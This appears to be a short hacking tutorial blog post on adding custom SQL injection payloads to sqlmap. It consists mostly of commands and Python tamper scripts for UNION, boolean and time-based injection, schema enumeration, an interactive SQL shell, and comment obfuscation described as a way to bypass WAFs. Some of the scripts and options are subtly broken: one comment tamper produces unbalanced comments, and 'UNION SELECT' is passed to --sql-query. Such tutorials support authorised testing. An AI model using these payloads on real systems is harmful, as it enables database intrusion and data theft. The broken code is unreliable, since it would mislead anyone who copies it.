---
title: "Add custom Payloads Directly in SQLMap"
tags: ['Hacking', 'SQLi']
date: 2024-10-03
toc: true
unlisted: true
---

## Example: Using `--sql-query`

### Simple Custom Payload

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

### Union-Based Custom Payload

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="UNION SELECT null, database(), user(), version()"
```

## Customizing Payloads with Tamper Scripts

If you need more flexibility and want to systematically apply custom payloads, you can create a tamper script that modifies the default payloads used by SQLMap.

### Example: Custom Tamper Script

**Create a Custom Tamper Script**

Create a new Python file in the tamper directory of your SQLMap installation, for example, `custom_payload_tamper.py`.

```
#!/usr/bin/env python
import random

__priority__ = 1

def dependencies():
    pass

def tamper(payload):
    """
    Custom tamper script to inject custom payloads
    """
    if payload:
        payload = payload.replace(" ", "/**/")
        if "SELECT" in payload.upper():
            payload = payload.replace("SELECT", "SELECT/**/custom_function(),")
    return payload
```

**Save the Script**

Save this script in the tamper directory of SQLMap.

**Use the Tamper Script with SQLMap**

Run SQLMap with your custom tamper script to apply your modifications to the payloads.

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=custom_payload_tamper
```

## Advanced Example with Multiple Payloads

You can combine multiple payloads and tamper scripts to create more complex injection tests. Below is an advanced example where custom payloads are systematically applied to the requests.

### Example: Combining Multiple Techniques

**Create a Complex Tamper Script**

```
#!/usr/bin/env python

import random

__priority__ = 1

def dependencies():
    pass

def tamper(payload):
    """
    Custom tamper script to apply multiple custom payloads
    """
    if payload:
        payload = payload.replace(" ", "/**/")
        
        if "UNION" in payload.upper():
            payload += " UNION SELECT null, user(), database(), version() --"
        
        if "AND" in payload.upper():
            payload += " AND IF(1=1, SLEEP(5), 0) --"
        
        if "OR" in payload.upper():
            payload += " OR (SELECT 1/0 FROM dual) --"
        
    return payload
```

**Save and Use the Script**

Save this script as `complex_tamper.py` in the tamper directory.

**Run SQLMap with the Complex Tamper Script**

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=complex_tamper
```


## Leveraging SQLMap's `--sql-query` Option

The `--sql-query` option allows you to directly specify SQL queries to be executed. This is useful for precise injection testing.

### Examples: Custom Queries with `--sql-query`

**Direct Version Query**

This command checks the version of the database:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

**Union-Based Query**

This command retrieves multiple pieces of information such as the database name, current user, and database version:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="UNION SELECT null, database(), user(), version()"
```

**Subquery Injection**

This command uses a subquery to extract table names:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT (SELECT table_name FROM information_schema.tables LIMIT 1)"
```

## Using `--sql-shell` for Interactive Injection

SQLMap's `--sql-shell` provides an interactive SQL shell for executing arbitrary SQL commands.

### Example: Starting SQL Shell

**Interactive Shell**

Start an interactive SQL shell to manually execute SQL commands:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell
```

**Executing Commands in Shell**

Execute commands in the SQL shell to retrieve information:

```
sql-shell> SELECT user();
sql-shell> SELECT database();
sql-shell> SELECT table_name FROM information_schema.tables;
```

## Creating Custom Tamper Scripts

Tamper scripts can modify payloads dynamically to bypass WAFs and other security measures.

### Example: Advanced Custom Tamper Script

**Script to Add Random Comments**

Create a script `random_comment_tamper.py`:

```
#!/usr/bin/env python

import random

__priority__ = 1

def dependencies():
    pass

def tamper(payload):
    """
    Adds random inline comments to the payload
    """
    if payload:
        parts = payload.split(" ")
        payload = " /*" + str(random.randint(1000, 9999)) + "*/ ".join(parts)
    return payload
```

**Save and Use the Script**

Save this script in the tamper directory of SQLMap and use it:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=random_comment_tamper
```

## Custom Payloads with `--prefix` and `--suffix`

You can use `--prefix` and `--suffix` to add custom SQL snippets before and after the payload.

### Examples: Using `--prefix` and `--suffix`

**Adding Prefix and Suffix**

Add custom snippets before and after the payload:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --prefix="/**/SELECT/**/" --suffix="/**/FROM/**/dual"
```

**Injecting with Custom Wrappers**

Wrap the payload with custom conditions:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --prefix="' OR 1=1; /*" --suffix="*/ --"
```

## Using SQLMap's `--eval` Option

The `--eval` option allows for evaluating Python code before sending requests, which can be used for dynamic payload generation.

### Example: Dynamic Payload Generation with `--eval`

**Dynamic Generation**

Generate a dynamic payload using Python code:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import random; id=random.randint(1,10)"
```

## Combining Techniques for Automated Testing

You can combine multiple techniques for comprehensive automated testing.

### Example: Full Automated Test with Custom Payloads

**Advanced Custom Payloads in Combination**

Combine various methods to create a comprehensive testing command:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" \
   --sql-query="UNION SELECT null, database(), user(), version()" \
   --tamper=random_comment_tamper \
   --prefix="' OR 1=1; /*" \
   --suffix="*/ --" \
   --level=5 --risk=3
```

## Example of an Advanced Tamper Script for Automated Testing

### Example: Randomized Time-Based Injection

Create a script `random_time_tamper.py`:

```
#!/usr/bin/env python

import random

__priority__ = 1

def dependencies():
    pass

def tamper(payload):
    """
    Adds a random time-based delay to the payload
    """
    if payload:
        delay = random.randint(1, 10)
        payload = payload.replace(" ", "/**/") + f" AND SLEEP({delay})"
    return payload
```

**Use with SQLMap**

Use the script with SQLMap:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=random_time_tamper
```
